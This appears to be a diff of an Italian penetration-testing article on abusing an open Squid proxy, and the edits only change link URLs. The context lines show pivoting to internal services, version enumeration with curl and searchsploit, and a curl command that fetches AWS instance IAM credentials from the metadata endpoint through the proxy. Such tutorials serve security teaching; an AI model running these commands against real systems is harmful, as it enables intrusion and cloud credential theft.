@@ -40,7 +40,7 @@ Attaccante ──────► │  Squid Proxy (:3128)          │
                     └──┴───────────────────────────┘
 ```
 
-Se il proxy permette richieste verso la rete interna, l'attaccante raggiunge [MySQL](https://hackita.it/articoli/porta-3306-mysql), [Redis](https://hackita.it/articoli/porta-6379-redis) o [Jenkins](https://hackita.it/articoli/porta-8080-tomcat) attraverso il proxy — anche se il firewall blocca l'accesso diretto.
+Se il proxy permette richieste verso la rete interna, l'attaccante raggiunge [MySQL](https://hackita.it/articoli/porta-3306-mysql/), [Redis](https://hackita.it/articoli/porta-6379-redis/) o [Jenkins](https://hackita.it/articoli/porta-8080-tomcat/) attraverso il proxy — anche se il firewall blocca l'accesso diretto.
 
 ## 1. Enumerazione
 
@@ -73,7 +73,7 @@ L'header `Via` rivela hostname interno (`squid-prod-01.corp.internal`) e version
 curl -s http://10.10.10.40:3128/
 ```
 
-Cerca CVE per la versione trovata su [Exploit-DB](https://hackita.it/articoli/exploit-db):
+Cerca CVE per la versione trovata su [Exploit-DB](https://hackita.it/articoli/exploitdb/):
 
 ```bash
 searchsploit squid 5.7
@@ -152,7 +152,7 @@ Se il proxy è su un'istanza cloud:
 curl -s -x http://10.10.10.40:3128 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ```
 
-Se risponde → credenziali IAM dell'istanza. Per il [privilege escalation AWS](https://hackita.it/articoli/aws-privilege-escalation).
+Se risponde → credenziali IAM dell'istanza. Per il [privilege escalation AWS](https://hackita.it/articoli/aws-privilege-escalation/).
 
 ### Tool di pentest via proxy
 
